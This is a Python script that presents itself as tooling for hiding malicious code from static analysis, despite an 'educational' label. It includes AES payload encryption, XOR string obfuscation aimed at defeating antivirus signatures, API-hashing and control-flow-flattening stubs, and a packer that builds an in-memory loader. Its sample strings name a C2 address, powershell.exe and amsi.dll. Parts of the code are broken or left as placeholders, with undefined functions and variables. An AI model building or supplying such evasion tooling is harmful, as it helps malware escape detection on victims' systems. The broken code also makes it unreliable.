#!/usr/bin/env python3
"""
Encryption and Obfuscation Techniques
Hides malicious code from static analysis
Educational/Research purposes only
"""
import os
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class Obfuscator:
    def __init__(self):
        self.key = os.urandom(32)
        self.iv = os.urandom(16)
    
    def aes_encrypt(self, plaintext):
        """
        AES-256-CBC encryption for payload encoding
        """
        cipher = Cipher(
            algorithms.AES(self.key),
            modes.CBC(self.iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        
        # PKCS7 padding
        pad_length = 16 - (len(plaintext) % 16)
        padded = plaintext + bytes([pad_length] * pad_length)
        
        ciphertext = encryptor.update(padded) + encryptor.finalize()
        return self.iv + ciphertext  # Prepend IV
    
    def string_obfuscation(self, string):
        """
        String obfuscation using XOR + base64
        Defeats simple string signatures
        """
        xor_key = os.urandom(len(string))
        xored = bytes(a ^ b for a, b in zip(string.encode(), xor_key))
        
        # Also XOR the key itself for nested obfuscation
        key_mask = os.urandom(len(xor_key))
        masked_key = bytes(a ^ b for a, b in zip(xor_key, key_mask))
        
        return {
            'data': base64.b64encode(xored).decode(),
            'key': base64.b64encode(masked_key).decode(),
            'mask': base64.b64encode(key_mask).decode()
        }
    
    def dynamic_api_resolution(self, dll_name, func_name):
        """
        Resolve APIs at runtime using hashes instead of strings
        Prevents IAT analysis and string detection
        """
        # Hash function names and compare
        dll_hash = hashlib.md5(dll_name.upper().encode()).hexdigest()[:8]
        func_hash = hashlib.md5(func_name.encode()).hexdigest()[:8]
        
        # Walk PEB to find loaded modules
        # Calculate hash of each export, compare to target
        # Return function pointer when matched
        
        return None
    
    def control_flow_flattening(self):
        """
        Control flow flattening - replaces structured code
        with state machine dispatcher
        """
        # Transforms:
        #
        # if (x):
        #     a()
        # else:
        #     b()
        #
        # Into:
        #
        # switch(state):
        #   case 0: if(x) state=1 else state=2; break
        #   case 1: a(); state=3; break
        #   case 2: b(); state=3; break
        
        pass
    
    def llvm_obf(self, bytecode):
        """
        Applies LLVM obfuscator passes (conceptual)
        - BogusControlFlow
        - Substitution  
        - Flattening
        """
        # Would integrate with ollvm or similar
        pass

class RuntimePack:
    """
    Runtime packer/loader
    """
    def pack(self, original_exe):
        """
        Compresses and encrypts EXE, prepends loader stub
        Result is packed executable that decrypts and runs
        original in memory
        """
        import zlib
        
        # Compress first
        compressed = zlib.compress(original_exe, 9)
        
        # Encrypt
        key = os.urandom(32)
        encrypted = self._encrypt(compressed, key)
        
        # Build loader stub
        stub = f'''
import ctypes, base64, zlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
key = {key!r}
iv, ct = encrypted[:16], encrypted[16:]
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
dt = cipher.decryptor().update(ct) + cipher.decryptor().finalize()
# ... load and execute
'''
        return stub

if __name__ == "__main__":
    obf = Obfuscator()
    
    # Example: obfuscate strings
    malicious_strings = [
        "http://c2.example.com",
        "powershell.exe",
        "amsi.dll"
    ]
    
    for s in malicious_strings:
        encoded = obf.string_obfuscation(s)
        print(f"{s} -> obfuscated")